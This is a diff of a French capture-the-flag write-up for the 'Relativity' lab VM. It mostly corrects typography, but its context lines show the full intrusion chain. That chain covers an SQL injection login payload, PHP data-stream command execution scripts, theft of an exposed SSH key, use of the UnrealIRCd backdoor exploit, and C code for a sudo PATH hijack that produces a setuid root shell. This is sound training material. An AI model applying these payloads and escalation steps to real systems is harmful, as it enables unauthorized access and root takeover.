@@ -12,9 +12,9 @@ L'objectif : se faire la main en sécurité informatique en testant ses compe�
 
 Certaines des VMs proposées sont plombées de toute part et permettent par exemple de s'amuser avec *SQLMap*.  
 
-Pour d'autres, aucune information n'est donnée quand aux vulnérabilités présentes. Le seul objectif consiste à capturer le drapeau et c'est à vous de trouver le cheminement pour y accèder. Ces challenges sont généralement intéressants et relativement proche de ce que l'on peut trouver dans la réalité, raison de plus pour s'y adonner.  
+Pour d'autres, aucune information n'est donnée quant aux vulnérabilités présentes. Le seul objectif consiste à capturer le drapeau et c'est à vous de trouver le cheminement pour y accèder. Ces challenges sont généralement intéressants et relativement proche de ce que l'on peut trouver dans la réalité, raison de plus pour s'y adonner.  
 
-Dans le présent article je vous présente une solution possible du CTF baptisé *"Relativity"* dont l'objectif est d'obtenir le drapeau qui est le contenu du fichier */root/flag.txt* accessible bien entendu seulement avec les privilèges du super-utilisateur.  
+Dans le présent article, je vous présente une solution possible du CTF baptisé *"Relativity"* dont l'objectif est d'obtenir le drapeau qui est le contenu du fichier */root/flag.txt* accessible bien entendu seulement avec les privilèges du super-utilisateur.  
 
 J'ai utilisé au maximum des logiciels libres, open-source et gratuits qui sont donc accessibles à tous.  
 
@@ -52,15 +52,15 @@ Bien ! Scannons les ports de la machine... Mais c'est quoi son IP au juste ?
 
 Malheureusement si les *Guest Additions* de *VirtualBox* n'ont pas été installées sur la VM il n'y a pas de moyen vraiment facile de l'obtenir.  
 
-Vous pouvez soit faire un *"arp -a"* et retrouver l'adresse MAC dans la liste ou procéder par élimination si l'adresse MAC n’apparaît pas.  
+Vous pouvez soit faire un `arp -a` et retrouver l'adresse MAC dans la liste ou procéder par élimination si l'adresse MAC n’apparaît pas.  
 
 Vous pouvez aussi lancer un PING scan avec *NMap* qui nous donnera l'adresse IP et l'adresse MAC de chaque machine présente sur le réseau :
 
-```
+```bash
 nmap -sn 192.168.1.0/24
 ```
 
-parmi les lignes obtenues je retrouve l'adresse MAC de la VM :
+Parmi les lignes obtenues je retrouve l'adresse MAC de la VM :
 
 ```
 Nmap scan report for 192.168.1.57
@@ -70,8 +70,8 @@ MAC Address: 08:00:27:D5:72:05 (Cadmus Computer Systems)
 
 Maintenant on peut lancer un scan de port de notre future victime (référez-vous au manuel de *NMap* pour la signification des options) :)
 
-```
-nmap -A 192.168.1.57
+```console
+$ nmap -A 192.168.1.57
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-03 19:07 CET
 Nmap scan report for 192.168.1.57
@@ -109,11 +109,11 @@ Nmap done: 1 IP address (1 host up) scanned in 35.71 seconds
 Get a shell or die tryin
 ------------------------
 
-Il y a donc 3 services qui tournent : un serveur web Apache 2.2.23, un serveur OpenSSH 5.9 ainsi qu'un serveur FTP qui semble inconnu mais dont la bannière est prometeuse (on peut lire mod\_sql).  
+Il y a donc 3 services qui tournent : un serveur web Apache 2.2.23, un serveur OpenSSH 5.9 ainsi qu'un serveur FTP qui semble inconnu, mais dont la bannière est prometteuse (on peut lire `mod_sql`).  
 
 Après un tour rapide sur le serveur web (rien d'intéressant de trouvé), on décide de s'attaquer au serveur FTP.  
 
-Qui dit SQL (comme dans mod\_sql) dit potentiellement injection SQL. On joue alors un peu avec le client FTP et le nom d'utilisateur et on s'apperçoit vite qu'il a du mal à digérer la présence de l'apostrophe dans le username :)  
+Qui dit SQL (comme dans `mod_sql`) dit potentiellement injection SQL. On joue alors un peu avec le client FTP et le nom d'utilisateur et on s'apperçoit vite qu'il a du mal à digérer la présence de l'apostrophe dans le username :)  
 
 ![Test injection SQL](/assets/img/relativity2.png)
 
@@ -121,17 +121,17 @@ Maintenant essayons de faire des injections qui ne font pas crasher la connexion
 
 Si on tente de fermer la requête SQL sous-jacente en saisissant le login root';# on obtient tout de même une fermeture prématurée de la connexion.  
 
-En revanche si on ne ferme pas la connexion mais qu'on l'agrémente d'une condition supplémentaire avec le nom d'utilisateur suivant :
+En revanche si on ne ferme pas la connexion, mais qu'on l'agrémente d'une condition supplémentaire avec le nom d'utilisateur suivant :
 
 ```
 root'/**/or/**/'1'='1
 ```
 
-on voit alors que tout se passe normalement (message indiquant que le password est invalide mais la connexion reste ouverte).  
+On voit alors que tout se passe normalement (message indiquant que le password est invalide, mais la connexion reste ouverte).  
 
-En remplaçant le '1' par un mot clé MySQL comme USER() ou VERSION() pas plus de crash ce qui confirme que l'on a bien affaire à une base MySQL.  
+En remplaçant le '1' par un mot clé MySQL comme `USER()` ou `VERSION()` pas plus de crash ce qui confirme que l'on a bien affaire à une base MySQL.  
 
-Si on indique la colonne 'passwd' pas de fermeture non plus. On pourrait donc assez facilement brute-forcer le nom des colonnes.
+Si on indique la colonne `passwd` pas de fermeture non plus. On pourrait donc assez facilement brute-forcer le nom des colonnes.
 Il est aussi possible de provoquer des timeouts en injectant un sleep() avec le nom d'utilisateur suivant :
 
 ```
@@ -193,7 +193,7 @@ On relance le client FTP et on utilise notre nom d'utilisateur très spécial.
 
 ![Connexion au serveur FTP](/assets/img/relativity4.png)
 
-Notre exploit a visiblement mis le serveur FTP dans un état un peu particulier car contrairement aux droits affichés on ne peut pas faire un *"cd"* dans le dossier *0f756638e0737f4a0de1c53bf8937a08*. Ce qui n'est pas trop génant puisqu'on peut lister son contenu.  
+Notre exploit a visiblement mis le serveur FTP dans un état un peu particulier, car contrairement aux droits affichés on ne peut pas faire un `cd` dans le dossier `0f756638e0737f4a0de1c53bf8937a08`. Ce qui n'est pas trop génant puisqu'on peut lister son contenu.  
 
 Hop ! Direction http://192.168.1.57/0f756638e0737f4a0de1c53bf8937a08/ voir si on trouve finalement quelque chose d'intéressant.  
 
@@ -201,9 +201,9 @@ En regardant comment sont formées les URLs il semble évident qu'on est en pr
 
 ![Pages web cachées](/assets/img/relativity5.png)
 
-On teste rapidement quelques entrées pour le paramètre page comme /etc/passwd, ../../../../../../etc/passwd, .htaccess, /proc/self/environ mais de toute évidence il y a une protection supplémentaire.  
+On teste rapidement quelques entrées pour le paramètre page comme `/etc/passwd`, `../../../../../../etc/passwd`, `.htaccess`, `/proc/self/environ` mais de toute évidence il y a une protection supplémentaire.  
 
-Idem en testant une injection via *php://input* (petit script qui pourrait vous servir) :
+Idem en testant une injection via `php://input` (petit script qui pourrait vous servir) :
 
 ```python
 import requests
@@ -216,7 +216,7 @@ print r.content
 
 Finalement on obtient un résultat avec l'utilisation d'un [flux data](https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/).  
 
-La fonction *system()* semble avoir été bloquée mais *passthru()* fonctionne à merveille :) On se fait un petit outil qui nous permet de passer des commandes presque comme si on y était :
+La fonction `system()` semble avoir été bloquée mais `passthru()` fonctionne à merveille :) On se fait un petit outil qui nous permet de passer des commandes presque comme si on y était :
 
 ```python
 import requests
@@ -239,9 +239,9 @@ except:
     print r.content
 ```
 
-On s’aperçoit assez vite que *wget* n'est pas installé et que *curl* a été retiré (*locate* indique son emplacement mais le binaire ne semble plus y être).  
+On s’aperçoit assez vite que `wget` n'est pas installé et que `curl` a été retiré (`locate` indique son emplacement, mais le binaire ne semble plus y être).  
 
-Via un *ls -alR /home* on découvre deux utilisateur : *jetta* et *mauk*.
+Via un `ls -alR /home` on découvre deux utilisateurs : `jetta` et `mauk`.
 Le second a été quelque peu permissif sur les droits d'accès de ses fichiers puisqu'il est possible de lire ses clés SSH !
 
 ```
@@ -271,33 +271,33 @@ drwxr-xr-x. 3 mauk mauk 4096 Jul  9  2013 ..
 -rw-r--r--. 1 mauk mauk  397 Feb 24  2013 id_rsa.pub
 ```
 
-On affiche le contenu de *id\_rsa* que l'on écrit dans un fichier *mauk\_key* en local puis on se connecte via SSH sur notre cible :
+On affiche le contenu de `id_rsa` que l'on écrit dans un fichier `mauk_key` en local puis on se connecte via SSH sur notre cible :
 
-```
+```bash
 ssh -i mauk_key mauk@192.168.1.57
 ```
 
-(on aura préalablement mis les bonnes permissions sur le fichier *mauk\_key* pour que SSH ne râle pas)  
+(on aura préalablement mis les bonnes permissions sur le fichier `mauk_key` pour que SSH ne râle pas)  
 
 ![Connexion avec le compte mauk](/assets/img/relativity6.png)
 
-Ca y est on est dans la boîte !
+Ça y est on est dans la boîte !
 
 Tant qu'il y a du shell, il y a de l'espoir
 -------------------------------------------
 
-Bien, on a maintenant un shell sexy grace à SSH mais on est pas encore parvenu à la capture du drapeau.  
+Bien, on a maintenant un shell sexy grace à SSH mais on n'est pas encore parvenu à la capture du drapeau.  
 
-Quelle est la suite des opérations ? Quand on fait un ps aux on remarque un exécutable lancé avec les droits de l'utilisateur *jetta* : */opt/Unreal/src/ircd*  
+Quelle est la suite des opérations ? Quand on fait un `ps aux` on remarque un exécutable lancé avec les droits de l'utilisateur `jetta` : `/opt/Unreal/src/ircd`  
 
-On a aucun droit sur le dossier */opt/Unreal*. Toutefois avec netstat on remarque que le serveur IRC tourne sur un port standard (6667). Au passage on retrouve le mysqld (3306) ainsi qu'un sendmail (25). Tous écoutent sur le loopback c'est pourquoi on ne les a pas découvert lors du scan.  
+On n'a aucun droit sur le dossier `/opt/Unreal`. Toutefois, avec netstat on remarque que le serveur IRC tourne sur un port standard (6667). Au passage, on retrouve le mysqld (3306) ainsi qu'un sendmail (25). Tous écoutent sur le loopback c'est pourquoi on ne les a pas découvert lors du scan.  
 
-Pour rendre le serveur IRC accessible depuis l'extérieur, on va mettre en place un relais. Comme *socat* n'est pas présent sur la machine, je vais rapatrier *KevProxy* (voir mon article [sur le bypass de firewall]({% link _posts/2011-01-09-Bypass-de-firewall-sur-le-port-source.md %}))  
+Pour rendre le serveur IRC accessible depuis l'extérieur, on va mettre en place un relais. Comme `socat` n'est pas présent sur la machine, je vais rapatrier `KevProxy` (voir mon article [sur le bypass de firewall]({% link _posts/2011-01-09-Bypass-de-firewall-sur-le-port-source.md %}))  
 .
 
-D'abord en local je lance [un serveur HTTP minimaliste python-powered](http://docs.python.org/2/library/simplehttpserver.html) en étant dans le même dossier que *KevProxy.c* :
+D'abord en local, je lance [un serveur HTTP minimaliste python-powered](http://docs.python.org/2/library/simplehttpserver.html) en étant dans le même dossier que `KevProxy.c` :
 
-```
+```bash
 python -m SimpleHTTPServer 8000
 ```
 
@@ -309,7 +309,7 @@ Puis sur mon accès VM :
 
 ![Redirection de port avec KevProxy](/assets/img/relativity7.png)
 
-Plus qu'à configurer *Konversation* pour se connecter au serveur *UnrealIRC* :  
+Plus qu'à configurer _Konversation_ pour se connecter au serveur *UnrealIRC* :  
 
 ![Connexion au serveur UnrealIRCd](/assets/img/relativity8.png)
 
@@ -321,34 +321,34 @@ Mon dévolu s'est porté sur l'exploit en version Python. Le principe de la ba
 AB;ls;
 ```
 
-Ainsi la commande *ls* sera exécutée. Il faut modifier quelque peu l'exploit car le serveur affiche deux messages avant de bien vouloir recevoir les commandes (on placera deux recv) et il faut aussi prendre en compte le fait que l'output n'est pas directement retourné (on lance les commandes en aveugle).  
+Ainsi la commande `ls` sera exécutée. Il faut modifier quelque peu l'exploit, car le serveur affiche deux messages avant de bien vouloir recevoir les commandes (on placera deux recv) et il faut aussi prendre en compte le fait que l'output n'est pas directement retourné (on lance les commandes en aveugle).  
 
-On va utiliser le fait qu'on dispose déjà d'une clé SSH connue sur le système pour nous ouvrir les portes de l'utilisateur *jetta* :
+On va utiliser le fait qu'on dispose déjà d'une clé SSH connue sur le système pour nous ouvrir les portes de l'utilisateur `jetta` :
 
-```
+```bash
 python 40820.py 192.168.1.57 9999 "mkdir -p /home/jetta/.ssh"
 python 40820.py 192.168.1.57 9999 "cat /home/mauk/.ssh/id_rsa.pub >> /home/jetta/.ssh/authorized_keys"
 ```
 
-puis on se connecte :
+Puis on se connecte :
 
-```
+```bash
 ssh -i mauk_key jetta@192.168.1.57
 ```
 
 Capture the flag
 ----------------
 
-On remarque que dans son *home* l'utilisateur dispose d'un dossier *auth\_server* appartenant à root.  
+On remarque que dans son *home* l'utilisateur dispose d'un dossier `auth_server` appartenant à root.  
 
-Dans ce dossier on trouve un autre binaire du même nom. Le programme n'est pas setuid root mais quand on appelle *sudo -l* on obtient :
+Dans ce dossier, on trouve un autre binaire du même nom. Le programme n'est pas setuid root mais quand on appelle `sudo -l` on obtient :
 
 ```
 User jetta may run the following commands on this host:
     (root) NOPASSWD: /home/jetta/auth_server/auth_server
 ```
 
-Donc si on fait *sudo auth\_server* le programme sera lancé comme si on était root. Par curiosité on lance un *strings* dessus et on remarque dans la vingtaine de lignes :
+Donc si on fait `sudo auth_server` le programme sera lancé comme si on était root. Par curiosité on lance un `strings` dessus et on remarque dans la vingtaine de lignes :
 
 ```
 could not establish connection
@@ -365,7 +365,7 @@ Comment le programme réagit-il quand on le lance normalement ?
 
 ![Fonctionnement de auth_server](/assets/img/relativity9.png)
 
-Modifions quelque peu les choses. D'abord écrivons un programme *fortune.c* comme suit dont le rôle est de passer un binaire à nous baptisé *gotroot* en setuid root :
+Modifions quelque peu les choses. D'abord écrivons un programme `fortune.c` comme suit dont le rôle est de passer un binaire à nous baptisé `gotroot` en setuid root :
 
 ```c
 #include <unistd.h>
@@ -380,7 +380,7 @@ int main(void)
 }
 ```
 
-puis le programme *gotroot.c* qui nous donnera un shell avec les privilèges du super utilisation :
+Puis le programme `gotroot.c` qui nous donnera un shell avec les privilèges du super utilisation :
 
 ```c
 #include <stdio.h>
@@ -396,7 +396,7 @@ int main(void)
 }
 ```
 
-On compile les deux, on modifie le path (*export PATH=.:$PATH*, on le voit pas dans la capture) et on profite :  
+On compile les deux, on modifie le path (`export PATH=.:$PATH`, on le voit pas dans la capture) et on profite :  
 
 ![Exploitation de auth_server](/assets/img/relativity10.png)
 
@@ -404,6 +404,6 @@ Ca y est, mission accomplished 8-)
 
 NB: Sur *vulnhub* vous trouverez d'autres solutions pour ce CTF. Certains participants sont passés par des techniques différentes et ont utilisé d'autres outils. Il peut être intéressant d'avoir les différentes solutions possibles.  
 
-En l’occurrence le serveur FTP est juste un *ProFTP* avec une bannière personnalisée mais ma version de *Nmap* n'a pas su le détecter. C'est dommage car un exploit relatif à son utilisation avec *mod\_sql* est trouvable sur la toile.
+En l’occurrence le serveur FTP est juste un *ProFTP* avec une bannière personnalisée, mais ma version de *Nmap* n'a pas su le détecter. C'est dommage, car un exploit relatif à son utilisation avec `mod_sql` est trouvable sur la toile.
 
 *Published March 04 2014 at 18:45*
